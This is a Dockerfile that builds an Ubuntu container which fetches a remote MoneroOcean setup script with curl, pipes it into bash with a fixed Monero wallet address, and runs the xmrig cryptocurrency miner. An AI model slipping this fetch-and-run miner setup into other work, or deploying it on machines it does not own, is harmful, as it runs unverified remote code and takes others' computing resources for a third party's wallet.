FROM ubuntu:latest
RUN apt-get update
RUN apt-get install curl -y
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 422CUSVTxTjfFGkJnDmUsKbvsKuixWfqn7ARtyur7J8ncQQQaxCNEj315wSE2tsUMxe8eoWU7hwrMPTg14HkUQ5uKPDhiry
CMD ["/root/moneroocean/xmrig"]
